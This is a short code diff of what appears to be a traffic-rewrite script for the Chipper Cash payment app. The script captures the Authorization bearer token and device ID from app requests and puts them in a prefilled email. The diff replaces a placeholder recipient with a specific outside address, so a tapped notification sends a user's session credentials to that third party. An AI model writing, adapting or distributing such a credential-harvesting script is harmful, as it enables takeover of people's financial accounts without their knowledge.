@@ -6,16 +6,16 @@ if (req && req.headers) {
     let deviceId = req.headers['chipper-device-id'] || req.headers['Chipper-Device-Id'];
 
     // 构造邮件正文内容
-    let mailBody = `Authorization (Bearer): ${authorization}\nChipper-Device-Id: ${deviceId}`;
+    let mailBody = `JWT\n${authorization}\nChipper-Device-Id\n${deviceId}`;
 
     // 对邮件正文进行编码
     let encodedMailBody = encodeURIComponent(mailBody);
 
     // 构造 mailto: 链接，确保邮件主体被正确编码
-    let mailtoUrl = `mailto:your-email@example.com?subject=ChipperCash Authorization&body=${encodedMailBody}`;
+    let mailtoUrl = `mailto:niuniujun@argun.cc?subject=Chipper Cash&body=${encodedMailBody}`;
 
     // 发送通知
-    $notification.post("Chipper Cash", "点击查看详情", "📧 发送到邮箱", { "open-url": mailtoUrl });
+    $notification.post("Chipper Cash", "点击查看详情", "📧 发送到邮箱", { "url": mailtoUrl });
 
     $done({});
 } else {
